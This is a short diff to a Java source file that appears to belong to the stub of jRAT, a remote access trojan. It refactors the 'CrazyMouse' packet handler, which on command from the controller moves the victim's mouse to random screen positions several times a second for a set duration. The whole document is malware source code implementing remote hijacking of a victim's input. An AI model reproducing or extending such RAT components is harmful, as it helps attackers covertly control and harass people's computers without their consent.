@@ -5,8 +5,7 @@ import java.awt.Toolkit;
 import java.util.Random;
 
 import se.jrat.stub.Connection;
-import se.jrat.stub.Main;
-
+import se.jrat.stub.utils.ScreenUtils;
 
 public class Packet46CrazyMouse extends AbstractIncomingPacket {
 
@@ -16,13 +15,12 @@ public class Packet46CrazyMouse extends AbstractIncomingPacket {
 		new Thread() {
 			public void run() {
 				try {
-					int t = time;
 					Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
 					int height = (int) screenRect.getHeight();
 					int width = (int) screenRect.getWidth();
 					Random random = new Random();
-					for (int i = 0; i < t * 4; i++) {
-						Main.robot.mouseMove(random.nextInt(width), random.nextInt(height));
+					for (int i = 0; i < time * 4; i++) {
+						ScreenUtils.getDefault().mouseMove(random.nextInt(width), random.nextInt(height));
 						Thread.sleep(250L);
 					}
 				} catch (Exception ex) {
